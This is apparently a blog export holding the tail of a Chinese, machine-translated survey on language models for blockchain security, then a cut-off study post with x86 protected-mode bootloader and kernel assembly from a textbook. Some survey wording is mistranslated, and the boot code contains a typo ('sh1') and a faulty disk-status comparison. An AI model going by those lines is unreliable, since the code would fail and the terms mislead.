基于共识的攻击利用共识机制中的漏洞进行比较。例如包括51%攻击，其中单个实体或联盟控制了网络的大部分哈希率，使他们能够操纵交易确认或执行双重支出攻击。同样，自私挖矿、日食攻击、远程攻击等攻击，都是针对特定共识协议的弱点，破坏区块链网络的安全性和可靠性\n智能合约漏洞：智能合约漏洞对区块链安全构成重大风险，因为它们可以被利用来执行未经授权的交易、消耗资金或触发意外行为。常见的智能合约漏洞包括重入攻击，攻击者在前一次调用完成之前反复调用易受攻击的合约的函数，使他们能够操纵合约的状态并窃取资金。其他漏洞，如整数溢出&#x2F;下溢、未检查的外部调用和gas限制漏洞，也可以被利用来破坏智能合约和底层区块链网络的安全性\nDeFi协议漏洞：去中心化金融（DeFi）协议由于其复杂的交互和可组合性带来了新的安全挑战。DeFi协议中的漏洞，如闪贷攻击、oracle操纵和治理漏洞，可能会给用户造成重大的经济损失，并破坏对DeFi的信任。此外，特定DeFi协议中的漏洞可能会对其他互联协议产生级联效应，从而放大安全漏洞和DeFi领域内系统风险的影响。\n辅助服务漏洞：辅助服务，如钱包、交易所、oracle和分散应用程序（DApps），是攻击者利用漏洞和破坏区块链系统安全性的入口点。辅助服务中的安全漏洞，如交易所黑客攻击、钱包漏洞或oracle操纵攻击，可能导致资金损失、对用户数据的未经授权访问或对链上交易的操纵。此外，区块链生态系统中辅助服务的互联特性放大了安全漏洞的影响，因为一个服务中的漏洞可能会传播到其他服务，从而导致大范围的中断和经济损失\n解决这些安全威胁和漏洞需要一种综合的方法，包括技术措施、最佳实践和社区协作，以加强b区块链系统的弹性和安全性。通过了解区块链安全的关键组成部分并减轻常见的安全威胁，利益相关者可以在分散的生态系统中促进更大的信任、透明度和采用，从而为全球用户推动创新和价值创造。\n3 LLM4BS任务的分类在本节中，我们将介绍一个主题分类法，该分类法旨在系统地对与区块链安全（LLM4BS）的大型语言模型相关的任务进行分类，并强调LLM在这些上下文中的功能。图3描述了LLM4BS任务的五种应用，包括智能合约代码审计§3.1、异常交易分析§3.2、智能合约动态分析§3.3、智能合约开发§3.4、加密货币社区参与者§3.5和其他潜在方向§3.6。\n3.1 LLM作为智能合约代码审核员LLM在智能合约代码审计和漏洞检测领域的应用可以简单概括如下：高级工具，如SMARTINV[31]、GPTScan[14]、David et al.[32]、Karanjai等，ContractArmor [34]， Ortu等人[35]，ASSBert [36]，PSCVFinder [37], LLM4Vuln [38], TrustLLM [39], AuditGPT [40]， Chen等[42]，Jain等[43]，PropertyGPT [41], SolGPT [44], defaligner [45], RepairBench [46], LLM-SmartAudit [47], Hyperion [48], AdvSCanner [49], S ‘ oley [50]， Jiang等[51]，XPLOGEN[52]。如表2所示，这些由大型语言模型提供支持的工具标志着从传统的、基于模式的分析方法向更具上下文意识和更全面的检查技术的巨大转变。这些尖端工具通过将不同的信息线索（包括详细描述智能合约的预期功能和事务结构的自然语言文档的细微方面）编织在一起，将其分析能力扩展到静态模式之外。\n\n通过多模态镜头集成代码和上下文数据，使这些工具具有揭示复杂逻辑疏忽和识别微妙的“机器不可审计”漏洞的能力，否则这些漏洞将逃避检测。通过吸收和解读更丰富的人类文化语言解释与代码相结合，基于LLM的工具更深入地研究了智能合约交互的复杂网络。从这种方法中获得的深刻理解不仅揭示了隐藏的漏洞，而且还加强了智能合约抵御可能导致重大财务影响的无数风险的能力。\n从本质上讲，将大型语言模型集成到智能合约分析中，标志着区块链技术在保障基础设施完整性方面的重大飞跃。它强调了人工智能与软件开发实践融合以加强安全措施的不断发展的前景。在LLM提供的敏锐见解的推动下，这种主动识别和纠正智能合约中的弱点，有助于巩固区块链交易中的信任和可靠性，从而减轻潜在的金融负债，并加强数字合约的基础。\n\n进一步扩展llm所扮演的关键角色，值得注意的是，这些模型在增强智能合约开发的整个生命周期方面具有巨大的潜力[134]。从一代到维护，LLM都是如此制定更安全、更稳健的智能合约。他们可能会在开发阶段提供建议，建议最佳实践，甚至生成符合安全指导原则的代码片段。在整个审计过程中，像gtscan和SMARTINV这样的工具可以不断学习和适应区块链技术和网络威胁不断发展的新漏洞模式。这种动态学习过程是至关重要的，因为它允许开发越来越精细的模型，这些模型甚至能够检测到最隐蔽和最复杂的漏洞。\n\n此外，LLM吸收上下文和理解与业务逻辑相关的代码的能力使他们在合同协议复杂且具有复杂逻辑的场景中特别有效。这在金融等领域尤其重要，在这些领域，智能合约管理着涉及巨额资金和众多利益相关者的交易。这样一个领域的漏洞可能会产生灾难性的影响，不仅在财务上，而且在相关实体的声誉损害方面。因此，准确有效的智能合约审计的重要性不容小觑。\nllm还通过促进开发人员、审计人员和最终用户之间的共同理解来增强整个行业的协作努力。他们用自然语言解析和解释代码的能力弥合了沟通的差距，使具有不同技术专业水平的利益相关者能够就智能合约的安全性和功能进行有意义的对话。这种合作环境促进了一种共同承担责任和积极参与解决和预防安全问题的文化。\n3.2LLM作为异常交易的分析师llm在区块链交易分析中的应用，如BLOCKGPT [28]， Nicholls等[53]和ZipZap[54]，强调了它们在进行实时监测以检测不规则或异常迹象或是可疑的行为方面的关键作用。表3中的这些工具代表了该领域的重大进步，因为它们提供了一种更动态、适应性更强的方法来识别区块链事务中的潜在威胁。\n与静态的、基于规则的系统不同，LLM能够实时处理和学习大量的交易数据，这使他们不仅能够发现已知的欺诈活动类型，还能够发现随着技术和攻击方法的发展而出现的新模式。通过利用机器学习的力量，这些模型可以不断更新他们对正常交易行为构成的理解。这种持续的学习过程对于适应区块链技术不断变化的环境和恶意行为者采用的复杂策略至关重要。\n此外，llm的适应性不仅限于模式识别，它们在理解事务上下文方面也表现出色。这包括对智能合约交互、执行跟踪、gas价格和其他交易元数据的分析，这些元数据可以提供有关交易合法性的提示。上下文分析允许LLM区分合法的，尽管不寻常的交易行为和真正的异常，这些异常可能表明欺诈活动，如洗钱，网络钓鱼或利用合同漏洞。\n除了识别潜在的欺诈交易外，LLM还有助于风险评估和监管合规。通过根据当前的合规标准和风险模型分析交易数据，法学硕士可以帮助金融机构管理其风险敞口，并遵守反洗钱（AML）和了解客户（KYC）法规。它们复杂的分析功能可以为合规官员和监管机构提供有价值的见解，允许采用更主动的方法来检测和预防金融犯罪。\n总之，LLM在区块链交易分析中的应用反映了对加强数字金融系统安全措施的承诺。通过将深度学习算法与广泛的交易数据集相结合，llm成为一道强大的防线，不仅能够实时识别异常活动，还能够随着威胁的发展而发展，确保管理基于区块链的交易的弹性和安全框架。\n\n3.3. LLM作为智能合约的Fuzzer大型语言模型（llm）已被越来越多地用于提升模糊化过程，特别是在智能合约安全分析领域，如LLM4FUZZ[55]、ACFIX[56]和Sun等。表4中的方法涉及利用llm来准确评估智能合约中特定代码区域的复杂性和漏洞可能性。因此，这些指标用于指导模糊测试者的方向和焦点，将他们引导到更有可能包含潜在安全威胁的代码段。\nllm应用于模糊测试练习，通过缩小模糊测试通常导航的巨大状态空间，显著提高了这些操作的效率。这种精确定位的模糊方法有助于提高覆盖率，并比传统工具揭示更多漏洞，特别是那些与传统方法可能忽略的智能合约代码的复杂性质有关的漏洞.\n此外，这种改进的模糊测试技术允许集成用户定义的不变量和手动插入的断言，以便在模糊测试期间监视和管理状态。这种方法可以减少勘探开销，并改进对常规模糊例程可能错过的更深刻逻辑问题的检测。在现实世界的去中心化金融（DeFi）项目中，对这种llm增强模糊方法的评估已经证明了它的有效性，优于基线模糊参数，并发现了重大漏洞。这些漏洞如果不被发现和利用，可能会造成重大的经济损失。\n总之，将llm融合到模糊工作流程中，为智能合约的自动安全分析所面临的挑战提供了一个有前途的智能解决方案，强调了它们增加基于区块链平台稳健性的潜力。\n\n3.4 LLM作为智能合约的开发人员表5中最近的研究，如Storhaug等人的[29]、karanjai等人的[33]、Petrovic等人的[61]、Zhao等人的[62]、Haque等人的[63]、MazzumaGPT[58]、Du等人的[59]和GPTutor[60]，已经开始考察ChatGPT和谷歌Palm2等大型语言模型（llm）在自动生成智能合约中的有效性和可靠性。这些智能合约是区块链生态系统不可或缺的一部分，无需中介即可执行协议，其准确性和安全性至关重要。该研究主要构建了一个测试框架，从多个方面评估智能合约，即有效性、正确性、效率、安全性和可维护性.\n这些结果表明，尽管llm在理解合同条款和生成语法正确的Solidity代码方面表现得很熟练，但通常生成的合同存在相当大的安全漏洞。这个发现表明了代码运行质量中的一个关键问题。评估表明，虽然LLM可以简化合同创建过程，但如果不进行彻底审查，生成的代码可能会被利用，这是一个潜在的风险。\n重要的是，这些研究强调了有效的提示工程的作用。结果表明，LLM的产出受到提示的特异性和清晰度的显著影响，必须精心设计提示，以尽量减少产生歧义或有缺陷的代码的风险。这尤其具有挑战性，因为生成智能合约需要精度，并且模型必须正确解释和应用法律术语的语义。\n这些工作指出了综合分析以及LLM所采用的方法的改进的重要性。人们乐观地认为，LLM的未来迭代，通过更好的培训和及时的设计考虑，可以提高人工智能生成的智能合约的质量和安全性。它还暗示了这些工具通过减少所需的时间和精力来彻底改变合同生成的潜力，同时也表明了对更强大的安全措施和测试方法的迫切需求。\n\n这样的研究分析为智能合约生成中LLM应用的现状提供了一个总体视图。这些发现是对过度依赖人工智能而没有进行充分检查的警示，但也为未来的进步制定了路线图，可以负责任地利用人工智能的全部潜力。\n3.5. LLM作为加密货币社区的参与者大型语言模型（llm），如GPT-3.5和ChatGPT，正在成为加密货币社区的强大工具，如Trozze等人[64]，Axelsen等人[65]，Liu等人[66]，Ziegler等人[67]和GPTutor[68]，尽管它们各自具有优势和劣势。表6中的相关作品共同描绘了LLM在高风险、高度不稳定的加密货币领域内变革治理和法律流程的潜力。\n治理成为一个主要主题，因为LLM可以为这个基本上不受监管的领域的结构和透明度做出重大贡献。第一份文件概述了人工智能系统面临的更广泛的治理挑战，建议区块链作为引入可验证性和问责制的可行解决方案。另一方面，LLM在捕捉法律推理的复杂性方面的局限性得到了强调，这一问题在三个研究中得到了不同程度的回应。\n这些模式在法律环境中的实际应用，特别是在第二和第三个文件中详细说明，强调了它们在起草法律申诉中的创新作用。这一发展为与加密货币法规和诉讼相关的法律工作未来带来了希望，因为它表明LLM可以减轻人类专家的一些工作量，尽管仍然需要人类监督。\n\n虽然治理和法律援助主导了话语，但在整个文本中都有一种谨慎乐观的基调。人们认识到LLM在加密货币领域的变革潜力，但也明确认识到人工智能技术需要进一步发展，以充分融入复杂的决策过程，其中法律和道德考虑至关重要。\n从本质上讲，这三份文件的集体叙述集中在一个前提上，即LLM对加密货币社区的治理和法律部门具有变革潜力，但必须克服理解上的挑战，才能完全信任他们的自治角色.\n3.6. 杂项如表7所示，LLM还应用于其他bb0安全领域，包括智能合约编译器[69]、零知识证明[70]、模型训练[22,71]、NFT生成[72]。我们将在以后详细介绍它们的应用。\n\n4 LLM4BS的案例研究在本节中，我们将通过三个不同的案例研究进行深入研究，每个案例研究都有助于说明和阐明区块链系统（LLM4BS）的大型语言模型的各种具体应用。表8中的这些案例经过精心挑选，涵盖了广泛的场景，包括LLM4FUZZ[55]§4.1、SMARTINV[31]§4.2、BLOCKGPT [28]\n4.1. LLM4Fuzz如图4所示，LLM4FUZZ[55]是网络安全领域的一项创新技术，特别是在区块链网络中的智能合约安全领域。它将大型语言模型（llm）的强大功能与模糊测试方法复杂地结合在一起，主动发现可能危及智能合约完整性的漏洞。\nLLM是高度复杂的人工智能模型，在理解和生成类似人类的文本方面取得了重大进展，最近，它们已被证明善于理解编程语言和代码结构。LLM4FUZZ通过部署llm来智能地指导模糊测试过程，从而利用了这种能力。这导致对智能合约进行更深刻和细致的探索，将测试工作集中在法学硕士认为最有可能包含安全漏洞的领域。通过这样做，LLM4FUZZ不仅成功地简化了异常检测过程，而且提高了其准确性和深度。\n在区块链技术的世界里，智能合约作为不可变的协议，根据编码条件自动执行，安全漏洞的潜在负面影响就会加剧。智能合约控制着重要的数字资产，对分布式应用程序（dApps）的功能至关重要。区块链的不可变特性增加了一层复杂性，因为部署的智能合约一旦提交给区块链，就无法更改。因此，先发制人的安全保证对于确保它们的可靠性和保护它们所管理的资产和过程变得至关重要。\nLLM4FUZZ通过识别和确定智能合约代码中潜在问题区域的优先级，提供了一种新颖的安全分析层。这种优先级是通过LLM对历史上或通常与漏洞相关的代码模式的学习理解来实现的.该方法增强了传统的模糊测试策略，传统的模糊测试策略通常采用一种更散弹枪的方法，即用随机数据输入轰击代码。LLM4FUZZ的目标测试不仅更高效，而且在发现可能被遗漏的复杂漏洞方面也更有效。\n\n在实现之后，LLM4FUZZ已经针对现有的模糊测试技术进行了基准测试，并始终表现出卓越的性能。它加快了漏洞检测过程，增加了可以检测到的安全缺陷的广度，从而加强了整体安全态势。\nLLM4FUZZ的案例象征着将人工智能整合到网络安全制度中的远见。它概括了人工智能对改进和重新定义现有技术流程的变革性影响，特别是在对蓬勃发展的数字经济至关重要的领域。通过它的镜头，我们瞥见了智能合约安全的未来——人工智能驱动的工具不仅可以预测，还可以积极参与对抗网络威胁的持续战斗。\n4.2. SMARTINV为了提高区块链智能合约的可靠性和安全性，SMARTINV[31]代表了该领域的重大突破。它的主要功能是推断智能合约中的不变量，这可以在自动化识别难以捉摸的错误的过程中不可或缺，这些错误通常会避开传统的机器审计方法。图5显示了SMARTINV的架构。\nSMARTINV的独特之处在于它的多模式学习策略，它承认真正理解智能合约的操作行为需要一个多方面的方法——一个结合和分析不同类型的信息或模式的方法。SMARTINV特别利用了智能合约中的静态代码和动态交易数据。通过将代码模式与事务行为相关联，SMARTINV准备揭示指向智能合约在其整个生命周期中的预期和预期状态的不变条件。这种整体方法确保对可能导致未来漏洞和利用的潜在安全弱点进行更彻底的检查和更高的检测率。\n\n该框架运行的前提是，没有单一的信息模式可以完全表达智能合约的复杂逻辑和潜在的边缘情况。因此，通过融合多个数据源，SMARTINV可以更准确地描述智能合约的功能，从而显着减少误报和更精确的错误检测。这种集成的智能合约分析方法促进了其部署和操作的更大保证，这在安全性和信任至关重要的区块链应用程序中是一个关键问题。\n在部署SMARTINV时，研究人员通过对一系列智能合约进行测试来证明其有效性，它不仅显示出高度的准确性，而且在可扩展性方面也表现出令人印象深刻的能力。SMARTINV成为智能合约开发和审计领域的宝贵资产，为未来的方法树立了先例，以其多模态分析框架为基础，在不断发展的区块链技术领域增强安全措施。\n\n4.3. BLOCKGPT如图6所示，BLOCKGPT[28]作为区块链安全领域的典范转变，作为最先进的入侵检测系统（IDS），专门用于抵消和识别区块链网络中的潜在恶意交易。IDS以高度复杂的大型语言模型为基础，该模型经过了来自以太坊区块链的大量交易数据的精心训练，以太坊区块链是业内使用最广泛的平台之一。\nBLOCKGPT的创新之处在于，它脱离了传统的主要依赖于预定规则或已知模式的检测方法。相反，BLOCKGPT采用了一种主动的、基于学习的方法，使其能够识别一系列异常情况，包括可以绕过传统基于规则的系统的复杂和以前未见过的威胁。\nBLOCKGPT在测试场景中取得了巨大的成功，证明了其检测能力的强大。它熟练地识别并适当地将124个经过验证的攻击交易中的49个排在各自受害者合同中发生的最不正常的三个交易中。这种高精确度表明该系统的精确异常识别算法，表明区块链的IDS领域取得了实质性进展。\n除了检测精度之外，BLOCKGPT的效率还体现在其处理速度上，平均每秒处理2,284笔交易，偏差相对较小。这种能力不仅是理论上的，而且表明系统已经准备好部署在实时监控和响应的现实区块链环境中至关重要的。\nBLOCKGPT的适应性扩展到各种区块链架构和应用，从金融到智能合约。这种多功能性与其实时处理能力相结合，提供了一个强大且可扩展的解决方案，可以无缝集成到现有区块链基础设施中，以增强其抵御各种安全威胁的弹性\n随着区块链技术继续融入数字交易和智能合约部署的结构，BLOCKGPT等系统代表了保护这些平台的重要组成部分。随着BLOCKGPT所基于的机器学习模型的采用，b区块链IDS的未来似乎越来越安全，为更安全、更可靠的区块链操作铺平了道路。\n5 LLM4BS任务的未来方向与挑战在深入研究区块链安全的大型语言模型（LLM4BS）的未来时，学术界与一系列关键的焦点领域进行了竞争，这些领域需要协调一致的学术努力来解决固有的挑战并扩展LLM在区块链系统中的实用性。为了反映这一研究领域固有的细微差别和复杂性，本文阐述了以下重点：\n跨学科关系：不可否认，LLM4BS下一阶段的本质是基于人工智能、网络保护机制和分布式账本技术领域之间的协调相互作用[136,137,13]。这种跨学科合作不仅是叠加的，而且是协同的，因为它利用了每个学科的优势和见解，形成了抵御网络仇恨的强大屏障。学术界和工业界都在呼吁建立一个强大的联盟，强调认知计算与加密弹性和分散架构的融合可以导致区块链网络安全的范式转变。\n监管和合规挑战：监管框架的变化不仅要求合规，还要求LLM4BS领域的学者和从业者积极参与监管机构[5,138]。这种关系是相互的；随着监管机构对将人工智能集成到b区块链的影响有了更深入的了解，这一领域的参与者有责任倡导鼓励创新的法规，同时保持强大的安全措施。尖端技术和监管之间的动态相互作用是一种微妙的平衡，为区块链安全解决方案的增长和适应提供了一个稳定而灵活的平台。\n动态安全威胁：网络威胁范围类似于嵌合兽——不断变异并呈现不可预见的挑战[18,139]。像LLM4BS这样的安全模型必须具有固有的可塑性，允许它们与它们所要对抗的威胁一起发展。LLM与区块链安全的整合不是一种静态的解决方案，而是一种不断适应的保障措施，需要一种广泛的网络安全方法，以应对复杂网络攻击的扩散以及目标破坏的微妙之处。保持b区块链事务的完整性取决于先发制人地识别和消除这些多变的威胁\n道德治理和偏见缓解：LLM4BS运作的道德毯是丰富而复杂的，要求对可能无意中传播偏见或不公平结果的安全实践进行认真的检查和解决[144,141]。对公平算法的追求超越了技术领域，涉及到技术部署的社会文化动态和道德层面。因此，超越统计偏见的研究，涉及哲学、社会学和伦理学，共同努力对于营造一种氛围至关重要，在这种氛围中，人工智能不仅可以加强安全，还可以以对正义和公平的潜在承诺为基础。\n能源考虑和人工智能可持续性：在解决区块链运营的碳足迹问题时，还迫切需要面对训练和部署大型语言模型的能源密集型特性[142,143,144]。这些人工智能系统的生态影响需要双重战略：提高算法效率以减少计算负荷，并探索可以可持续地为这些活动提供动力的替代能源。在LLM4BS应用中对生态和谐的追求必须反映出区块链技术各方面对可持续性的更广泛承诺，确保安全能力的加速不会以不可持续的环境成本为代价。\n人工智能中的伦理考虑：在LLM4BS实施的轨迹中，伦理的作用不能被夸大，因为它支撑着人工智能应用的各个方面——从数据来源到算法的透明度，再到人工智能或借助人工智能做出的决策的问责制。为LLM4BS实施一个强有力的道德框架需要一个深刻的拷问指导人工智能开发的原则，鼓励渗透到模型设计、部署和监控的每一层的审查。因此，创造一种环境，在这种环境中，对人工智能驱动的安全措施的信任不仅是假设，而且是通过负责任的做法精心培养的。\n数据质量和访问：健壮的LLM4BS部署的核心是数据的基本元素——它的口径、范围和提供给它的可访问性。这里存在着挑战：构建和维护数据库，这些数据库不仅要全面和具有代表性，而且要着眼于提高大型语言模型在检测异常和加强区块链事务中的安全参数方面的有效性。这项任务扩展到制定协议，以确保数据完整性和符合道德标准的采购，从而维护这些人工智能系统的神圣性和可靠性。解决这些问题需要一种战略性的、方法学的方法来充分利用LLM4BS的潜力。这包括对正在进行的研究的承诺，严格的道德审查，以及与技术和监管环境同步发展的协同努力。对这些要点有了基本的了解，社区就能更好地为LLM4BS增强b区块链安全措施的弹性和效率铺平道路。\n6 总结总之，我们对将大型语言模型（llm）集成到区块链安全中的回顾突出了LLM4BS组合所带来的技术进步和复杂挑战。llm在区块链中增强安全协议的潜力是显而易见的，为智能合约、异常交易检测和加密货币社区发展提供了创新的解决方案。然而，要实现这一潜力，需要对可扩展性、隐私、不断发展的网络威胁以及人工智能的伦理影响保持警惕。LLM在区块链安全领域的成功不仅取决于持续的技术改进，还取决于道德实践、监管一致性和知情的社区参与。LLM与区块链安全的整合标志着一个变革的时代，需要一种协作的方式，平衡创新与审慎的监督，以建立一个有弹性和公平的安全未来。\n","tags":["智能合约论文"]},{"title":"小型内核加载程序.md","url":"/2025/11/06/%E5%B0%8F%E5%9E%8B%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BD%E7%A8%8B%E5%BA%8F-md/","content":"李忠老师书中15章的内容，浅读时觉得十分困难乏味，如今按照先看懂代码再看书理解思路的方式，将整个代码进行了手敲，感受颇多，也体会到了李忠老师深厚的汇编功底。\n整个代码分为三个部分\n\n主引导代码：负责设置GDT和加载内核代码\n内核代码：负责用户程序的加载\n用户程序：读取一个扇区中的内容并显示\n\n再次建议大家自己手敲一遍代码，理解程度绝非是直接看书能够比拟的。许多难以理解的代码李忠老师均已作出解答。\n主引导区代码\n;主引导分区的代码，主要用于加载内核core_base_address equ 0x00040000 ;定义常数，内核加载的起始位置core_start_sector equ 0x00000001 ;开始的逻辑扇区，用工具先把内核写在1扇区;常规设置套路;初始化堆栈mov ax,csmov ss,axmov sp,0x7c00;计算GDT逻辑地址mov eax,[cs:pgdt+ 0x7c00 + 0x02] ;GDT的物理地址xor edx,edx ;清零mov ebx,16div ebx ;商在eax里，余数在edxmov ds,eax ;指向GDTmov ebx,edx ;偏移;创建0号描述符可以跳过;创建1，数据段，对应0-4GB空间mov dword [ebx + 0x08],0x0000ffff ; 段界限为0xffffmov dword [ebx + 0x0c],0x00cf9200 ; 粒度4kB，;创建2，代码段，mov dword [ebx + 0x10],0x7c0001ff ; 基地址是0x7c00，界限0x1ff，代码是从7c00开始的mov dword [ebx + 0x14],0x00409800 ; 粒度为1字节;创建3，堆栈段mov dword [ebx + 0x18],0x7c00fffe ; 基地址7c00，界限0xFFFE，另名代码段mov dword [ebx + 0x1c],0x00cf9600 ; 粒度4KB;创建4，显示缓冲区mov dword [ebx + 0x20],0x80007fff ; 基地址B800，界限0x7fffmov dword [ebx + 0x24],0x0040920b ; 粒度为1字节;初始化GFDTRmov word [cs:pgdt+0x7c00],39 ; 描述符界限lgdt [cs:pgdt+0x7c00] ;我们代码运行在7c00处，pgdt拿到的是相对7c00的偏移量;其他工作 打开A20in al,0x92or al,0000_0010Bout 0x92,al;打开开关cli ;关闭中断mov eax,cr0or eax,1mov cr0,eax ;进入保护模式jmp 0x0010:flush ;0x0010是选择子代码段，这里是因为当前主引导就已经在7c00了[bits 32]flush:  ;初始化数据段和堆栈  mov eax,0x0008 ;选择子-&gt;0000000000001000 -数据段  mov ds,eax  mov eax,0x0018 ;堆栈段  mov ss,eax  xor esp,esp   ;加载系统核心程序  mov edi,core_base_address  mov eax,core_start_sector  mov ebx,edi  call read_hard_disk_0 ;从指定的扇区中读写数据到指定位置  ;判断核心程序的大小  mov eax,[edi] ;核心程序的尺寸  xor edx,edx  mov ecx,512  div ecx ;每个扇区为512字节，所以除以512  or edx,edx  jnz @1 ;判断余数是否为0，不为0，则说明还有扇区没有读完  dec eax ;这里保存着除数，除数为核心程序大小的扇区数，因为前面已经读了一个扇区了，所以减一@1:  or eax,eax ; 考虑程序&lt;=512的情况，就只有一个扇区  jz setup  ;如果还有  mov ecx,eax  mov eax,core_start_sector  inc eax ;从下一个扇区开始读@2:  call read_hard_disk_0  inc eax  loop @2 ;此时这里的ecx就是所有的扇区数量，读完为止setup:  mov esi,[pgdt+0x7c00+0x02]  ;创建公用例程描述符  mov eax,[edi+0x04] ;公共例程段的偏移，在core中定义的  mov ebx,[edi+0x08]; 核心数据段偏移  sub ebx,eax  dec ebx ;公共例程段界限 （代码量-1）  add eax,edi ;公共例程段的基地址4000+相对偏移  mov ecx,0x00409800 ;代码段描述符  call make_gdt_descriptor  mov [esi+0x028],eax  mov [esi+0x02c],edx  ;建立核心数据段描述符  mov eax,[edi+0x08]                 ;核心数据段起始汇编地址  mov ebx,[edi+0x0c]                 ;核心代码段汇编地址   sub ebx,eax  dec ebx                            ;核心数据段界限  add eax,edi                        ;核心数据段基地址  mov ecx,0x00409200                 ;字节粒度的数据段描述符   call make_gdt_descriptor  mov [esi+0x30],eax  mov [esi+0x34],edx   ;建立核心代码段描述符  mov eax,[edi+0x0c]                 ;核心代码段起始汇编地址  mov ebx,[edi+0x00]                 ;程序总长度  sub ebx,eax  dec ebx                            ;核心代码段界限  add eax,edi                        ;核心代码段基地址  mov ecx,0x00409800                 ;字节粒度的代码段描述符  call make_gdt_descriptor  mov [esi+0x38],eax  mov [esi+0x3c],edx  mov word [pgdt+0x7c00],63 ;添加了内核描述符，更新GDT  lgdt [pgdt+0x7c00]  ;至此内核程序加载全部完成，正式进入内核段进行执行  jmp far [edi+0x10] ;edi+0x10是内核入口偏移，core中定义;=============================================================================make_gdt_descriptor:  ;构造描述符，eax：基地址，ebx：段界限，ecx：属性。返回一个完整的描述符  ;前32位  mov edx,eax  sh1 eax,16 ;左移16位，保留低16位的基地址  or ax,bx ;将bx中的段界限放入低16位  and edx,0xffff0000 ;清除低16位  rol edx,8 ;循环左移8位，重新排列  bswap edx ;字节交换  xor bx,bx ;清零  or edx,ebx   or edx,ecx  ret;=============================================================================read_hard_disk_0:  ;负责从硬盘读一个逻辑扇区，eax为扇区号，ds:ebx为目标地址  push eax  push ecx  push edx  push eax  ;读取扇区数1  mov dx,0x1f2  mov al,1  out dx,al  ;发送逻辑扇区号32位，进行拆分发送  inc dx ;0x1f3  pop eax  out dx,al  inc dx ;0x1f4  mov cl,8  shr eax,cl  out dx,al  inc dx ;0x1f5  shr eax,cl  out dx,al   inc dx ;0x1f6  shr eax,cl  or al,0xe0  out dx,al  inc dx ;0x1f7  mov al,0x20 ;读命令  out dx,al.waits:  in al,dx ;从dx中读状态给ax  and al,0x88 ;只关注7.3号位  cmp al,0x88 ;都为1则处理完成  jnz .waits  mov ecx,256 ;总共读256个字  mov dx,0x1f0 .readw:  in ax,dx ;从0x1f0中读一个字给ax  mov [ebx],ax  add ebx,2  loop .readw  ;读写完成  pop edx  pop ecx  pop eax  ret;============================================================================pgdt: dw 0  dd 0x00007e00 ;GDT物理地址\n\n内核代码：\n;-------------------------------------------------------------------------------         ;以下常量定义部分。内核的大部分内容都应当固定                ;!!!!注意常量的定义并不占内存空间，也就是说实际的开始地址依然是下面的core_length         core_code_seg_sel     equ  0x38    ;内核代码段选择子         core_data_seg_sel     equ  0x30    ;内核数据段选择子          sys_routine_seg_sel   equ  0x28    ;系统公共例程代码段的选择子          video_ram_seg_sel     equ  0x20    ;视频显示缓冲区的段选择子         core_stack_seg_sel    equ  0x18    ;内核堆栈段选择子         mem_0_4_gb_seg_sel    equ  0x08    ;整个0-4GB内存的段的选择子;-------------------------------------------------------------------------------         ;以下是系统核心的头部，用于加载核心程序          core_length      dd core_end       ;核心程序总长度#00         sys_routine_seg  dd section.sys_routine.start                                            ;系统公用例程段位置#04         core_data_seg    dd section.core_data.start                                            ;核心数据段位置#08         core_code_seg    dd section.core_code.start                                            ;核心代码段位置#0c         core_entry       dd start          ;核心代码段入口点#10                          dw core_code_seg_sel;================================================================================[bits 32];=================================================================================SECTION sys_routine vstart=0 ;公共例程段;字符串显示put_string:  push ecx  .getc:  mov cl,[ebx] ;要显示的字符   or cl,cl ;判断是否为0  jz .exit  call put_char  inc ebx  jmp .getc  .exit:  pop ecx  retf ;段间返回 ;================================================================================ put_char:                                   ;在当前光标处显示一个字符,并推进                                            ;光标。仅用于段内调用                                             ;输入：CL=字符ASCII码          pushad         ;以下取当前光标位置         mov dx,0x3d4         mov al,0x0e         out dx,al         inc dx                             ;0x3d5         in al,dx                           ;高字         mov ah,al         dec dx                             ;0x3d4         mov al,0x0f         out dx,al         inc dx                             ;0x3d5         in al,dx                           ;低字         mov bx,ax                          ;BX=代表光标位置的16位数         cmp cl,0x0d                        ;回车符？         jnz .put_0a         mov ax,bx         mov bl,80         div bl         mul bl         mov bx,ax         jmp .set_cursor  .put_0a:         cmp cl,0x0a                        ;换行符？         jnz .put_other         add bx,80         jmp .roll_screen  .put_other:                               ;正常显示字符         push es         mov eax,video_ram_seg_sel          ;0xb8000段的选择子         mov es,eax         shl bx,1         mov [es:bx],cl         pop es         ;以下将光标位置推进一个字符         shr bx,1         inc bx  .roll_screen:         cmp bx,2000                        ;光标超出屏幕？滚屏         jl .set_cursor         push bx                            ;为了修改原书程序的逻辑问题，新增         push ds         push es         mov eax,video_ram_seg_sel         mov ds,eax         mov es,eax         cld         mov esi,0xa0                       ;小心！32位模式下movsb/w/d          mov edi,0x00                       ;使用的是esi/edi/ecx          mov ecx,1920         rep movsw         mov bx,3840                        ;清除屏幕最底一行         mov ecx,80                         ;32位程序应该使用ECX  .cls:         mov word[es:bx],0x0720         add bx,2         loop .cls         pop es         pop ds         ;mov bx,1920                       ;为了修改原书程序的逻辑问题，删除         pop bx                             ;为了修改原书程序的逻辑问题，新增         sub bx,80                          ;为了修改原书程序的逻辑问题，新增  .set_cursor:         mov dx,0x3d4         mov al,0x0e         out dx,al         inc dx                             ;0x3d5         mov al,bh         out dx,al         dec dx                             ;0x3d4         mov al,0x0f         out dx,al         inc dx                             ;0x3d5         mov al,bl         out dx,al         popad         ret                          ;================================================================================read_hard_disk_0:                           ;从硬盘读取一个逻辑扇区                                            ;EAX=逻辑扇区号                                            ;DS:EBX=目标缓冲区地址                                            ;返回：EBX=EBX+512         push eax          push ecx         push edx           push eax            mov dx,0x1f2         mov al,1         out dx,al                          ;读取的扇区数         inc dx                             ;0x1f3         pop eax         out dx,al                          ;LBA地址7~0         inc dx                             ;0x1f4         mov cl,8         shr eax,cl         out dx,al                          ;LBA地址15~8         inc dx                             ;0x1f5         shr eax,cl         out dx,al                          ;LBA地址23~16         inc dx                             ;0x1f6         shr eax,cl         or al,0xe0                         ;第一硬盘  LBA地址27~24         out dx,al         inc dx                             ;0x1f7         mov al,0x20                        ;读命令         out dx,al  .waits:         in al,dx         and al,0x88         cmp al,0x08         jnz .waits                         ;不忙，且硬盘已准备好数据传输          mov ecx,256                        ;总共要读取的字数         mov dx,0x1f0  .readw:         in ax,dx         mov [ebx],ax         add ebx,2         loop .readw         pop edx         pop ecx         pop eax           retf                               ;段间返回 allocate_memory:  ;分配内存，ecx为分配的字节数，输出ecx为起始位置  push ds  push eax  push ebx  mov eax,core_data_seg_sel ;ds指向数据段  mov ds,eax  ;定位到要分配的物理地址  mov 